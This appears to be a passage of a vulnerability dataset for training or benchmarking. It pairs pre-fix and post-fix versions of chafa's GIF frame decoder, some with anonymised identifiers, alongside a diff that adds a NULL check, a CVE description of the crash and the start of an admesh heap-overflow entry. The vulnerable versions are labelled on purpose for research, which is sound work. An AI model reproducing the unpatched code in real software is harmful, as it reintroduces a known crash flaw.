frame_scanline = frame_data + offset_x + ((offset_y + y) * gif->width);
if (gif->frames[frame].transparency) {
memset(frame_scanline,
GIF_TRANSPARENT_COLOUR,
width * 4);
} else {
memset(frame_scanline,
colour_table[gif->background_index],
width * 4);
}
}
}
}
gif_decode_frame_exit:
if (gif->frames[frame].virgin) {
if (gif->bitmap_callbacks.bitmap_test_opaque) {
gif->frames[frame].opaque = gif->bitmap_callbacks.bitmap_test_opaque(gif->frame_image);
} else {
gif->frames[frame].opaque = false;
}
gif->frames[frame].virgin = false;
}
if (gif->bitmap_callbacks.bitmap_set_opaque) {
gif->bitmap_callbacks.bitmap_set_opaque(gif->frame_image, gif->frames[frame].opaque);
}
if (gif->bitmap_callbacks.bitmap_modified) {
gif->bitmap_callbacks.bitmap_modified(gif->frame_image);
}
gif->buffer_position = save_buffer_position;
return return_value;
}","static gif_result
gif_internal_decode_frame(gif_animation *VAR_0,
unsigned int VAR_1,
bool VAR_2)
{
unsigned int VAR_3 = 0;
const unsigned char *VAR_4, *VAR_5;
ssize_t VAR_6;
unsigned int VAR_7, VAR_8, VAR_9, VAR_10;
unsigned int VAR_11, VAR_12, VAR_13;
unsigned int *VAR_14;
unsigned int *VAR_15 = 0;
unsigned int *VAR_16;
ssize_t VAR_17;
unsigned int VAR_18 = 0;
unsigned int VAR_19, VAR_20, VAR_21, VAR_22;
register unsigned char VAR_23;
if (VAR_0->frames[VAR_1].display == false) {
return VAR_24;
}
if (VAR_1 > VAR_0->frame_count_partial) {
return VAR_25;
}
if ((!VAR_2) &&
((int)VAR_1 == VAR_0->decoded_frame)) {
return VAR_24;
}
VAR_4 = VAR_0->gif_data + VAR_0->frames[VAR_1].frame_pointer;
VAR_5 = VAR_0->gif_data + VAR_0->buffer_size;
VAR_6 = (VAR_5 - VAR_4);
if (VAR_6 < 12) {
return VAR_26;
}
VAR_17 = VAR_0->buffer_position;
VAR_0->buffer_position = VAR_4 - VAR_0->gif_data;
if ((VAR_18 = gif_skip_frame_extensions(VAR_0)) != VAR_24) {
goto gif_decode_frame_exit;
}
VAR_4 = (VAR_0->gif_data + VAR_0->buffer_position);
VAR_6 = (VAR_5 - VAR_4);
if (VAR_6 < 12) {
VAR_18 = VAR_26;
goto gif_decode_frame_exit;
}
if (VAR_4[0] != VAR_27) {
VAR_18 = VAR_28;
goto gif_decode_frame_exit;
}
VAR_9 = VAR_4[1] | (VAR_4[2] << 8);
VAR_10 = VAR_4[3] | (VAR_4[4] << 8);
VAR_7 = VAR_4[5] | (VAR_4[6] << 8);
VAR_8 = VAR_4[7] | (VAR_4[8] << 8);
if ((VAR_9 + VAR_7 > VAR_0->width) ||
(VAR_10 + VAR_8 > VAR_0->height)) {
VAR_18 = VAR_28;
goto gif_decode_frame_exit;
}
VAR_11 = VAR_4[9];
VAR_12 = 2 << (VAR_11 & VAR_29);
VAR_13 = VAR_11 & VAR_30;
VAR_4 += 10;
VAR_6 = (VAR_5 - VAR_4);
if (VAR_11 & VAR_31) {
if (VAR_6 < (int)(3 * VAR_12)) {
VAR_18 = VAR_26;
goto gif_decode_frame_exit;
}
VAR_14 = VAR_0->local_colour_table;
if (!VAR_2) {
for (VAR_3 = 0; VAR_3 < VAR_12; VAR_3++) {
unsigned char *VAR_32 =
(unsigned char *) &VAR_14[VAR_3];
VAR_32[0] = VAR_4[0];
VAR_32[1] = VAR_4[1];
VAR_32[2] = VAR_4[2];
VAR_32[3] = 0xff;
VAR_4 += 3;
}
} else {
VAR_4 += 3 * VAR_12;
}
VAR_6 = (VAR_5 - VAR_4);
} else {
VAR_14 = VAR_0->global_colour_table;
}
if (VAR_6 < 1) {
VAR_18 = VAR_26;
goto gif_decode_frame_exit;
}
if (VAR_4[0] == VAR_33) {
VAR_18 = VAR_24;
goto gif_decode_frame_exit;
}
assert(VAR_0->bitmap_callbacks.bitmap_get_buffer);
VAR_15 = (void *)VAR_0->bitmap_callbacks.bitmap_get_buffer(VAR_0->frame_image);
if (!VAR_15) {
return VAR_34;
}
if (!VAR_2) {
lzw_result VAR_35;
const uint8_t *VAR_36;
const uint8_t *VAR_37;
if (VAR_6 < 2) {
VAR_18 = VAR_26;
goto gif_decode_frame_exit;
}
if ((VAR_6 == 2) && (VAR_4[1] == VAR_33)) {
VAR_18 = VAR_24;
goto gif_decode_frame_exit;
}
if ((VAR_1 == 0) || (VAR_0->decoded_frame == VAR_38)) {
memset((char*)VAR_15,
VAR_39,
VAR_0->width * VAR_0->height * sizeof(int));
VAR_0->decoded_frame = VAR_1;
} else if ((VAR_1 != 0) &&
(VAR_0->frames[VAR_1 - 1].disposal_method == VAR_40)) {
VAR_18 = gif_internal_decode_frame(VAR_0,
(VAR_1 - 1),
true);
if (VAR_18 != VAR_24) {
goto gif_decode_frame_exit;
}
} else if ((VAR_1 != 0) &&
(VAR_0->frames[VAR_1 - 1].disposal_method == VAR_41)) {
int VAR_42 = VAR_1 - 2;
while ((VAR_42 >= 0) &&
(VAR_0->frames[VAR_42].disposal_method == VAR_41)) {
VAR_42--;
}
if (VAR_42 == -1) {
memset((char*)VAR_15,
VAR_39,
VAR_0->width * VAR_0->height * sizeof(int));
} else {
VAR_18 = gif_internal_decode_frame(VAR_0, VAR_42, false);
if (VAR_18 != VAR_24) {
goto gif_decode_frame_exit;
}
assert(VAR_0->bitmap_callbacks.bitmap_get_buffer);
VAR_15 = (void *)VAR_0->bitmap_callbacks.bitmap_get_buffer(VAR_0->frame_image);
if (!VAR_15) {
return VAR_34;
}
}
}
VAR_0->decoded_frame = VAR_1;
VAR_0->buffer_position = (VAR_4 - VAR_0->gif_data) + 1;
VAR_35 = lzw_decode_init(VAR_0->lzw_ctx, VAR_0->gif_data,
VAR_0->buffer_size, VAR_0->buffer_position,
VAR_4[0], &VAR_36, &VAR_37);
if (VAR_35 != VAR_43) {
return gif_error_from_lzw(VAR_35);
}
for (VAR_20 = 0; VAR_20 < VAR_8; VAR_20++) {
if (VAR_13) {
VAR_21 = gif_interlaced_line(VAR_8, VAR_20) + VAR_10;
} else {
VAR_21 = VAR_20 + VAR_10;
}
VAR_16 = VAR_15 + VAR_9 + (VAR_21 * VAR_0->width);
VAR_19 = VAR_7;
while (VAR_19 > 0) {
VAR_22 = (VAR_37 - VAR_36);
if (VAR_22 > 0) {
if (VAR_22 > VAR_19) {
VAR_22 = VAR_19;
}
VAR_19 -= VAR_22;
while (VAR_22-- > 0) {
VAR_23 = *--VAR_37;
if (((VAR_0->frames[VAR_1].transparency) &&
(VAR_23 != VAR_0->frames[VAR_1].transparency_index)) ||
(!VAR_0->frames[VAR_1].transparency)) {
*VAR_16 = VAR_14[VAR_23];
}
VAR_16++;
}
} else {
VAR_35 = lzw_decode(VAR_0->lzw_ctx, &VAR_37);
if (VAR_35 != VAR_43) {
if (VAR_35 == VAR_44) {
VAR_18 = VAR_24;
} else {
VAR_18 = gif_error_from_lzw(VAR_35);
}
goto gif_decode_frame_exit;
}
}
}
}
} else {
if (VAR_0->frames[VAR_1].disposal_method == VAR_40) {
for (VAR_20 = 0; VAR_20 < VAR_8; VAR_20++) {
VAR_16 = VAR_15 + VAR_9 + ((VAR_10 + VAR_20) * VAR_0->width);
if (VAR_0->frames[VAR_1].transparency) {
memset(VAR_16,
VAR_39,
VAR_7 * 4);
} else {
memset(VAR_16,
VAR_14[VAR_0->background_index],
VAR_7 * 4);
}
}
}
}
gif_decode_frame_exit:
if (VAR_0->frames[VAR_1].virgin) {
if (VAR_0->bitmap_callbacks.bitmap_test_opaque) {
VAR_0->frames[VAR_1].opaque = VAR_0->bitmap_callbacks.bitmap_test_opaque(VAR_0->frame_image);
} else {
VAR_0->frames[VAR_1].opaque = false;
}
VAR_0->frames[VAR_1].virgin = false;
}
if (VAR_0->bitmap_callbacks.bitmap_set_opaque) {
VAR_0->bitmap_callbacks.bitmap_set_opaque(VAR_0->frame_image, VAR_0->frames[VAR_1].opaque);
}
if (VAR_0->bitmap_callbacks.bitmap_modified) {
VAR_0->bitmap_callbacks.bitmap_modified(VAR_0->frame_image);
}
VAR_0->buffer_position = VAR_17;
return VAR_18;
}",hpjansson/chafa/e4b777c7b7c144cd16a0ea96108267b1004fe6c9/libnsgif.c/vul/before/0.json,"static gif_result
gif_internal_decode_frame(gif_animation *gif,
                          unsigned int frame,
                          bool clear_image)
{
        unsigned int index = 0;
        const unsigned char *gif_data, *gif_end;
        ssize_t gif_bytes;
        unsigned int width, height, offset_x, offset_y;
        unsigned int flags, colour_table_size, interlace;
        unsigned int *colour_table;
        unsigned int *frame_data = 0;	// Set to 0 for no warnings
        unsigned int *frame_scanline;
        ssize_t save_buffer_position;
        unsigned int return_value = 0;
        unsigned int x, y, decode_y, burst_bytes;
        register unsigned char colour;

        /* If the GIF has no frame data, frame holders will not be allocated in
         * gif_initialise() */
        if (gif->frames == NULL) {
                return GIF_INSUFFICIENT_DATA;
        }

        /* Ensure this frame is supposed to be decoded */
        if (gif->frames[frame].display == false) {
                return GIF_OK;
        }

        /* Ensure the frame is in range to decode */
        if (frame > gif->frame_count_partial) {
                return GIF_INSUFFICIENT_DATA;
        }

        /* done if frame is already decoded */
        if ((!clear_image) &&
            ((int)frame == gif->decoded_frame)) {
                return GIF_OK;
        }

        /* Get the start of our frame data and the end of the GIF data */
        gif_data = gif->gif_data + gif->frames[frame].frame_pointer;
        gif_end = gif->gif_data + gif->buffer_size;
        gif_bytes = (gif_end - gif_data);

        /*
         * Ensure there is a minimal amount of data to proceed.  The shortest
         * block of data is a 10-byte image descriptor + 1-byte gif trailer
         */
        if (gif_bytes < 12) {
                return GIF_INSUFFICIENT_FRAME_DATA;
        }

        /* Save the buffer position */
        save_buffer_position = gif->buffer_position;
        gif->buffer_position = gif_data - gif->gif_data;

        /* Skip any extensions because they have allready been processed */
        if ((return_value = gif_skip_frame_extensions(gif)) != GIF_OK) {
                goto gif_decode_frame_exit;
        }
        gif_data = (gif->gif_data + gif->buffer_position);
        gif_bytes = (gif_end - gif_data);

        /* Ensure we have enough data for the 10-byte image descriptor + 1-byte
         * gif trailer
         */
        if (gif_bytes < 12) {
                return_value = GIF_INSUFFICIENT_FRAME_DATA;
                goto gif_decode_frame_exit;
        }

        /* 10-byte Image Descriptor is:
         *
         *	+0	CHAR	Image Separator (0x2c)
         *	+1	SHORT	Image Left Position
         *	+3	SHORT	Image Top Position
         *	+5	SHORT	Width
         *	+7	SHORT	Height
         *	+9	CHAR	__Packed Fields__
         *			1BIT	Local Colour Table Flag
         *			1BIT	Interlace Flag
         *			1BIT	Sort Flag
         *			2BITS	Reserved
         *			3BITS	Size of Local Colour Table
         */
        if (gif_data[0] != GIF_IMAGE_SEPARATOR) {
                return_value = GIF_DATA_ERROR;
                goto gif_decode_frame_exit;
        }
        offset_x = gif_data[1] | (gif_data[2] << 8);
        offset_y = gif_data[3] | (gif_data[4] << 8);
        width = gif_data[5] | (gif_data[6] << 8);
        height = gif_data[7] | (gif_data[8] << 8);

        /* Boundary checking - shouldn't ever happen except unless the data has
         * been modified since initialisation.
         */
        if ((offset_x + width > gif->width) ||
            (offset_y + height > gif->height)) {
                return_value = GIF_DATA_ERROR;
                goto gif_decode_frame_exit;
        }

        /* Decode the flags */
        flags = gif_data[9];
        colour_table_size = 2 << (flags & GIF_COLOUR_TABLE_SIZE_MASK);
        interlace = flags & GIF_INTERLACE_MASK;

        /* Advance data pointer to next block either colour table or image
         * data.
         */
        gif_data += 10;
        gif_bytes = (gif_end - gif_data);

        /* Set up the colour table */
        if (flags & GIF_COLOUR_TABLE_MASK) {
                if (gif_bytes < (int)(3 * colour_table_size)) {
                        return_value = GIF_INSUFFICIENT_FRAME_DATA;
                        goto gif_decode_frame_exit;
                }
                colour_table = gif->local_colour_table;
                if (!clear_image) {
                        for (index = 0; index < colour_table_size; index++) {
                                /* Gif colour map contents are r,g,b.
                                 *
                                 * We want to pack them bytewise into the
                                 * colour table, such that the red component
                                 * is in byte 0 and the alpha component is in
                                 * byte 3.
                                 */
                                unsigned char *entry =
                                        (unsigned char *) &colour_table[index];

                                entry[0] = gif_data[0];	/* r */
                                entry[1] = gif_data[1];	/* g */
                                entry[2] = gif_data[2];	/* b */
                                entry[3] = 0xff;	/* a */

                                gif_data += 3;
                        }
                } else {
                        gif_data += 3 * colour_table_size;
                }
                gif_bytes = (gif_end - gif_data);
        } else {
                colour_table = gif->global_colour_table;
        }

        /* Ensure sufficient data remains */
        if (gif_bytes < 1) {
                return_value = GIF_INSUFFICIENT_FRAME_DATA;
                goto gif_decode_frame_exit;
        }

        /* check for an end marker */
        if (gif_data[0] == GIF_TRAILER) {
                return_value = GIF_OK;
                goto gif_decode_frame_exit;
        }

        /* Get the frame data */
        assert(gif->bitmap_callbacks.bitmap_get_buffer);
        frame_data = (void *)gif->bitmap_callbacks.bitmap_get_buffer(gif->frame_image);
        if (!frame_data) {
                return GIF_INSUFFICIENT_MEMORY;
        }

        /* If we are clearing the image we just clear, if not decode */
        if (!clear_image) {
                lzw_result res;
                const uint8_t *stack_base;
                const uint8_t *stack_pos;

                /* Ensure we have enough data for a 1-byte LZW code size +
                 * 1-byte gif trailer
                 */
                if (gif_bytes < 2) {
                        return_value = GIF_INSUFFICIENT_FRAME_DATA;
                        goto gif_decode_frame_exit;
                }

                /* If we only have a 1-byte LZW code size + 1-byte gif trailer,
                 * we're finished
                 */
                if ((gif_bytes == 2) && (gif_data[1] == GIF_TRAILER)) {
                        return_value = GIF_OK;
                        goto gif_decode_frame_exit;
                }

                /* If the previous frame's disposal method requires we restore
                 * the background colour or this is the first frame, clear
                 * the frame data
                 */
                if ((frame == 0) || (gif->decoded_frame == GIF_INVALID_FRAME)) {
                        memset((char*)frame_data,
                               GIF_TRANSPARENT_COLOUR,
                               gif->width * gif->height * sizeof(int));
                        gif->decoded_frame = frame;
                        /* The line below would fill the image with its
                         * background color, but because GIFs support
                         * transparency we likely wouldn't want to do that. */
                        /* memset((char*)frame_data, colour_table[gif->background_index], gif->width * gif->height * sizeof(int)); */
                } else if ((frame != 0) &&
                           (gif->frames[frame - 1].disposal_method == GIF_FRAME_CLEAR)) {
                        return_value = gif_internal_decode_frame(gif,
                                                                 (frame - 1),
                                                                 true);
                        if (return_value != GIF_OK) {
                                goto gif_decode_frame_exit;
                        }

                } else if ((frame != 0) &&
                           (gif->frames[frame - 1].disposal_method == GIF_FRAME_RESTORE)) {
                        /*
                         * If the previous frame's disposal method requires we
                         * restore the previous image, find the last image set
                         * to ""do not dispose"" and get that frame data
                         */
                        int last_undisposed_frame = frame - 2;
                        while ((last_undisposed_frame >= 0) &&
                               (gif->frames[last_undisposed_frame].disposal_method == GIF_FRAME_RESTORE)) {
                                last_undisposed_frame--;
                        }

                        /* If we don't find one, clear the frame data */
                        if (last_undisposed_frame == -1) {
                                /* see notes above on transparency
                                 * vs. background color
                                 */
                                memset((char*)frame_data,
                                       GIF_TRANSPARENT_COLOUR,
                                       gif->width * gif->height * sizeof(int));
                        } else {
                                return_value = gif_internal_decode_frame(gif, last_undisposed_frame, false);
                                if (return_value != GIF_OK) {
                                        goto gif_decode_frame_exit;
                                }
                                /* Get this frame's data */
                                assert(gif->bitmap_callbacks.bitmap_get_buffer);
                                frame_data = (void *)gif->bitmap_callbacks.bitmap_get_buffer(gif->frame_image);
                                if (!frame_data) {
                                        return GIF_INSUFFICIENT_MEMORY;
                                }
                        }
                }
                gif->decoded_frame = frame;
                gif->buffer_position = (gif_data - gif->gif_data) + 1;

                /* Initialise the LZW decoding */
                res = lzw_decode_init(gif->lzw_ctx, gif->gif_data,
                                gif->buffer_size, gif->buffer_position,
                                gif_data[0], &stack_base, &stack_pos);
                if (res != LZW_OK) {
                        return gif_error_from_lzw(res);
                }

                /* Decompress the data */
                for (y = 0; y < height; y++) {
                        if (interlace) {
                                decode_y = gif_interlaced_line(height, y) + offset_y;
                        } else {
                                decode_y = y + offset_y;
                        }
                        frame_scanline = frame_data + offset_x + (decode_y * gif->width);

                        /* Rather than decoding pixel by pixel, we try to burst
                         * out streams of data to remove the need for end-of
                         * data checks every pixel.
                         */
                        x = width;
                        while (x > 0) {
                                burst_bytes = (stack_pos - stack_base);
                                if (burst_bytes > 0) {
                                        if (burst_bytes > x) {
                                                burst_bytes = x;
                                        }
                                        x -= burst_bytes;
                                        while (burst_bytes-- > 0) {
                                                colour = *--stack_pos;
                                                if (((gif->frames[frame].transparency) &&
                                                     (colour != gif->frames[frame].transparency_index)) ||
                                                    (!gif->frames[frame].transparency)) {
                                                        *frame_scanline = colour_table[colour];
                                                }
                                                frame_scanline++;
                                        }
                                } else {
                                        res = lzw_decode(gif->lzw_ctx, &stack_pos);
                                        if (res != LZW_OK) {
                                                /* Unexpected end of frame, try to recover */
                                                if (res == LZW_OK_EOD) {
                                                        return_value = GIF_OK;
                                                } else {
                                                        return_value = gif_error_from_lzw(res);
                                                }
                                                goto gif_decode_frame_exit;
                                        }
                                }
                        }
                }
        } else {
                /* Clear our frame */
                if (gif->frames[frame].disposal_method == GIF_FRAME_CLEAR) {
                        for (y = 0; y < height; y++) {
                                frame_scanline = frame_data + offset_x + ((offset_y + y) * gif->width);
                                if (gif->frames[frame].transparency) {
                                        memset(frame_scanline,
                                               GIF_TRANSPARENT_COLOUR,
                                               width * 4);
                                } else {
                                        memset(frame_scanline,
                                               colour_table[gif->background_index],
                                               width * 4);
                                }
                        }
                }
        }
gif_decode_frame_exit:

        /* Check if we should test for optimisation */
        if (gif->frames[frame].virgin) {
                if (gif->bitmap_callbacks.bitmap_test_opaque) {
                        gif->frames[frame].opaque = gif->bitmap_callbacks.bitmap_test_opaque(gif->frame_image);
                } else {
                        gif->frames[frame].opaque = false;
                }
                gif->frames[frame].virgin = false;
        }

        if (gif->bitmap_callbacks.bitmap_set_opaque) {
                gif->bitmap_callbacks.bitmap_set_opaque(gif->frame_image, gif->frames[frame].opaque);
        }

        if (gif->bitmap_callbacks.bitmap_modified) {
                gif->bitmap_callbacks.bitmap_modified(gif->frame_image);
        }

        /* Restore the buffer position */
        gif->buffer_position = save_buffer_position;

        return return_value;
}","static gif_result
gif_internal_decode_frame(gif_animation *VAR_0,
                          unsigned int VAR_1,
                          bool VAR_2)
{
        unsigned int VAR_3 = 0;
        const unsigned char *VAR_4, *VAR_5;
        ssize_t VAR_6;
        unsigned int VAR_7, VAR_8, VAR_9, VAR_10;
        unsigned int VAR_11, VAR_12, VAR_13;
        unsigned int *VAR_14;
        unsigned int *VAR_15 = 0;	/* COMMENT_0 */
        unsigned int *VAR_16;
        ssize_t VAR_17;
        unsigned int VAR_18 = 0;
        unsigned int VAR_19, VAR_20, VAR_21, VAR_22;
        register unsigned char VAR_23;

        /* COMMENT_1 */
                              
        if (VAR_0->frames == NULL) {
                return VAR_24;
        }

        /* COMMENT_3 */
        if (VAR_0->frames[VAR_1].display == false) {
                return VAR_25;
        }

        /* COMMENT_4 */
        if (VAR_1 > VAR_0->frame_count_partial) {
                return VAR_24;
        }

        /* COMMENT_5 */
        if ((!VAR_2) &&
            ((int)VAR_1 == VAR_0->decoded_frame)) {
                return VAR_25;
        }

        /* COMMENT_6 */
        VAR_4 = VAR_0->gif_data + VAR_0->frames[VAR_1].frame_pointer;
        VAR_5 = VAR_0->gif_data + VAR_0->buffer_size;
        VAR_6 = (VAR_5 - VAR_4);

        /* COMMENT_7 */
                                                                             
                                                                           
           
        if (VAR_6 < 12) {
                return VAR_26;
        }

        /* COMMENT_11 */
        VAR_17 = VAR_0->buffer_position;
        VAR_0->buffer_position = VAR_4 - VAR_0->gif_data;

        /* COMMENT_12 */
        if ((VAR_18 = gif_skip_frame_extensions(VAR_0)) != VAR_25) {
                goto gif_decode_frame_exit;
        }
        VAR_4 = (VAR_0->gif_data + VAR_0->buffer_position);
        VAR_6 = (VAR_5 - VAR_4);

        /* COMMENT_13 */
                      
           
        if (VAR_6 < 12) {
                VAR_18 = VAR_26;
                goto gif_decode_frame_exit;
        }

        /* COMMENT_16 */
          
                                         
                                       
                                      
                         
                          
                                    
                                         
                                
                           
                           
                                             
           
        if (VAR_4[0] != VAR_27) {
                VAR_18 = VAR_28;
                goto gif_decode_frame_exit;
        }
        VAR_9 = VAR_4[1] | (VAR_4[2] << 8);
        VAR_10 = VAR_4[3] | (VAR_4[4] << 8);
        VAR_7 = VAR_4[5] | (VAR_4[6] << 8);
        VAR_8 = VAR_4[7] | (VAR_4[8] << 8);

        /* COMMENT_30 */
                                              
           
        if ((VAR_9 + VAR_7 > VAR_0->width) ||
            (VAR_10 + VAR_8 > VAR_0->height)) {
                VAR_18 = VAR_28;
                goto gif_decode_frame_exit;
        }

        /* COMMENT_33 */
        VAR_11 = VAR_4[9];
        VAR_12 = 2 << (VAR_11 & VAR_29);
        VAR_13 = VAR_11 & VAR_30;

        /* COMMENT_34 */
                
           
        VAR_4 += 10;
        VAR_6 = (VAR_5 - VAR_4);

        /* COMMENT_37 */
        if (VAR_11 & VAR_31) {
                if (VAR_6 < (int)(3 * VAR_12)) {
                        VAR_18 = VAR_26;
                        goto gif_decode_frame_exit;
                }
                VAR_14 = VAR_0->local_colour_table;
                if (!VAR_2) {
                        for (VAR_3 = 0; VAR_3 < VAR_12; VAR_3++) {
                                /* COMMENT_38 */
                                  
                                                                         
                                                                            
                                                                             
                                          
                                   
                                unsigned char *VAR_32 =
                                        (unsigned char *) &VAR_14[VAR_3];

                                VAR_32[0] = VAR_4[0];	/* COMMENT_45 */
                                VAR_32[1] = VAR_4[1];	/* COMMENT_46 */
                                VAR_32[2] = VAR_4[2];	/* COMMENT_47 */
                                VAR_32[3] = 0xff;	/* COMMENT_48 */

                                VAR_4 += 3;
                        }
                } else {
                        VAR_4 += 3 * VAR_12;
                }
                VAR_6 = (VAR_5 - VAR_4);
        } else {
                VAR_14 = VAR_0->global_colour_table;
        }

        /* COMMENT_49 */
        if (VAR_6 < 1) {
                VAR_18 = VAR_26;
                goto gif_decode_frame_exit;
        }

        /* COMMENT_50 */
        if (VAR_4[0] == VAR_33) {
                VAR_18 = VAR_25;
                goto gif_decode_frame_exit;
        }

        /* COMMENT_51 */
        assert(VAR_0->bitmap_callbacks.bitmap_get_buffer);
        VAR_15 = (void *)VAR_0->bitmap_callbacks.bitmap_get_buffer(VAR_0->frame_image);
        if (!VAR_15) {
                return VAR_34;
        }

        /* COMMENT_52 */
        if (!VAR_2) {
                lzw_result VAR_35;
                const uint8_t *VAR_36;
                const uint8_t *VAR_37;

                /* COMMENT_53 */
                                     
                   
                if (VAR_6 < 2) {
                        VAR_18 = VAR_26;
                        goto gif_decode_frame_exit;
                }

                /* COMMENT_56 */
                                 
                   
                if ((VAR_6 == 2) && (VAR_4[1] == VAR_33)) {
                        VAR_18 = VAR_25;
                        goto gif_decode_frame_exit;
                }

                /* COMMENT_59 */
                                                                          
                                 
                   
                if ((VAR_1 == 0) || (VAR_0->decoded_frame == VAR_38)) {
                        memset((char*)VAR_15,
                               VAR_39,
                               VAR_0->width * VAR_0->height * sizeof(int));
                        VAR_0->decoded_frame = VAR_1;
                        /* COMMENT_63 */
                                                                     
                                                                              
                        /* COMMENT_66 */
                } else if ((VAR_1 != 0) &&
                           (VAR_0->frames[VAR_1 - 1].disposal_method == VAR_40)) {
                        VAR_18 = gif_internal_decode_frame(VAR_0,
                                                                 (VAR_1 - 1),
                                                                 true);
                        if (VAR_18 != VAR_25) {
                                goto gif_decode_frame_exit;
                        }

                } else if ((VAR_1 != 0) &&
                           (VAR_0->frames[VAR_1 - 1].disposal_method == VAR_41)) {
                        /* COMMENT_67 */
                                                                              
                                                                              
                                                                      
                           
                        int VAR_42 = VAR_1 - 2;
                        while ((VAR_42 >= 0) &&
                               (VAR_0->frames[VAR_42].disposal_method == VAR_41)) {
                                VAR_42--;
                        }

                        /* COMMENT_72 */
                        if (VAR_42 == -1) {
                                /* COMMENT_73 */
                                                       
                                   
                                memset((char*)VAR_15,
                                       VAR_39,
                                       VAR_0->width * VAR_0->height * sizeof(int));
                        } else {
                                VAR_18 = gif_internal_decode_frame(VAR_0, VAR_42, false);
                                if (VAR_18 != VAR_25) {
                                        goto gif_decode_frame_exit;
                                }
                                /* COMMENT_76 */
                                assert(VAR_0->bitmap_callbacks.bitmap_get_buffer);
                                VAR_15 = (void *)VAR_0->bitmap_callbacks.bitmap_get_buffer(VAR_0->frame_image);
                                if (!VAR_15) {
                                        return VAR_34;
                                }
                        }
                }
                VAR_0->decoded_frame = VAR_1;
                VAR_0->buffer_position = (VAR_4 - VAR_0->gif_data) + 1;

                /* COMMENT_77 */
                VAR_35 = lzw_decode_init(VAR_0->lzw_ctx, VAR_0->gif_data,
                                VAR_0->buffer_size, VAR_0->buffer_position,
                                VAR_4[0], &VAR_36, &VAR_37);
                if (VAR_35 != VAR_43) {
                        return gif_error_from_lzw(VAR_35);
                }

                /* COMMENT_78 */
                for (VAR_20 = 0; VAR_20 < VAR_8; VAR_20++) {
                        if (VAR_13) {
                                VAR_21 = gif_interlaced_line(VAR_8, VAR_20) + VAR_10;
                        } else {
                                VAR_21 = VAR_20 + VAR_10;
                        }
                        VAR_16 = VAR_15 + VAR_9 + (VAR_21 * VAR_0->width);

                        /* COMMENT_79 */
                                                                            
                                                   
                           
                        VAR_19 = VAR_7;
                        while (VAR_19 > 0) {
                                VAR_22 = (VAR_37 - VAR_36);
                                if (VAR_22 > 0) {
                                        if (VAR_22 > VAR_19) {
                                                VAR_22 = VAR_19;
                                        }
                                        VAR_19 -= VAR_22;
                                        while (VAR_22-- > 0) {
                                                VAR_23 = *--VAR_37;
                                                if (((VAR_0->frames[VAR_1].transparency) &&
                                                     (VAR_23 != VAR_0->frames[VAR_1].transparency_index)) ||
                                                    (!VAR_0->frames[VAR_1].transparency)) {
                                                        *VAR_16 = VAR_14[VAR_23];
                                                }
                                                VAR_16++;
                                        }
                                } else {
                                        VAR_35 = lzw_decode(VAR_0->lzw_ctx, &VAR_37);
                                        if (VAR_35 != VAR_43) {
                                                /* COMMENT_83 */
                                                if (VAR_35 == VAR_44) {
                                                        VAR_18 = VAR_25;
                                                } else {
                                                        VAR_18 = gif_error_from_lzw(VAR_35);
                                                }
                                                goto gif_decode_frame_exit;
                                        }
                                }
                        }
                }
        } else {
                /* COMMENT_84 */
                if (VAR_0->frames[VAR_1].disposal_method == VAR_40) {
                        for (VAR_20 = 0; VAR_20 < VAR_8; VAR_20++) {
                                VAR_16 = VAR_15 + VAR_9 + ((VAR_10 + VAR_20) * VAR_0->width);
                                if (VAR_0->frames[VAR_1].transparency) {
                                        memset(VAR_16,
                                               VAR_39,
                                               VAR_7 * 4);
                                } else {
                                        memset(VAR_16,
                                               VAR_14[VAR_0->background_index],
                                               VAR_7 * 4);
                                }
                        }
                }
        }
gif_decode_frame_exit:

        /* COMMENT_85 */
        if (VAR_0->frames[VAR_1].virgin) {
                if (VAR_0->bitmap_callbacks.bitmap_test_opaque) {
                        VAR_0->frames[VAR_1].opaque = VAR_0->bitmap_callbacks.bitmap_test_opaque(VAR_0->frame_image);
                } else {
                        VAR_0->frames[VAR_1].opaque = false;
                }
                VAR_0->frames[VAR_1].virgin = false;
        }

        if (VAR_0->bitmap_callbacks.bitmap_set_opaque) {
                VAR_0->bitmap_callbacks.bitmap_set_opaque(VAR_0->frame_image, VAR_0->frames[VAR_1].opaque);
        }

        if (VAR_0->bitmap_callbacks.bitmap_modified) {
                VAR_0->bitmap_callbacks.bitmap_modified(VAR_0->frame_image);
        }

        /* COMMENT_86 */
        VAR_0->buffer_position = VAR_17;

        return VAR_18;
}",hpjansson/chafa/e4b777c7b7c144cd16a0ea96108267b1004fe6c9/libnsgif.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -15,6 +15,12 @@
         unsigned int return_value = 0;
         unsigned int x, y, decode_y, burst_bytes;
         register unsigned char colour;
+
+        /* If the GIF has no frame data, frame holders will not be allocated in
+         * gif_initialise() */
+        if (gif->frames == NULL) {
+                return GIF_INSUFFICIENT_DATA;
+        }
 
         /* Ensure this frame is supposed to be decoded */
         if (gif->frames[frame].display == false) {","{'deleted_lines': [], 'added_lines': ['', '        /* If the GIF has no frame data, frame holders will not be allocated in', '         * gif_initialise() */', '        if (gif->frames == NULL) {', '                return GIF_INSUFFICIENT_DATA;', '        }']}",True,chafa: NULL Pointer Dereference in function gif_internal_decode_frame at libnsgif.c:599 allows attackers to cause a denial of service (crash) via a crafted input file. in GitHub repository hpjansson/chafa prior to 1.10.2. chafa: NULL Pointer Dereference in function gif_internal_decode_frame at libnsgif.c:599 allows attackers to cause a denial of service (crash) via a crafted input file.,5.5,MEDIUM,1,valid,2022-04-24T21:56:53Z,4
CVE-2018-25033,['CWE-125'],AV:N/AC:M/Au:N/C:P/I:N/A:P,0,admesh,"Fix heap buffer overflow in stl_update_connects_remove_1


- Add argument value check to the stl_update_connects_remove_1
- Add neighbor value check in stl_remove_degenerate

Fixes https://github.com/admesh/admesh/issues/28
Merges https://github.com/admesh/admesh/pull/55",e84d8353f1347e1f26f0a95770d92ba14e6ede38,https://github.com/admesh/admesh/commit/e84d8353f1347e1f26f0a95770d92ba14e6ede38,src/connect.c,stl_remove_degenerate,"static void
stl_remove_degenerate(stl_file *stl, int facet) {
int edge1;
int edge2;
int edge3;
int neighbor1;
int neighbor2;
int neighbor3;
int vnot1;
int vnot2;
int vnot3;
if (stl->error) return;
if(   !memcmp(&stl->facet_start[facet].vertex[0],
&stl->facet_start[facet].vertex[1], sizeof(stl_vertex))
&& !memcmp(&stl->facet_start[facet].vertex[1],
&stl->facet_start[facet].vertex[2], sizeof(stl_vertex))) {
printf(""removing a facet in stl_remove_degenerate\n"");
stl_remove_facet(stl, facet);
return;
}
if(!memcmp(&stl->facet_start[facet].vertex[0],
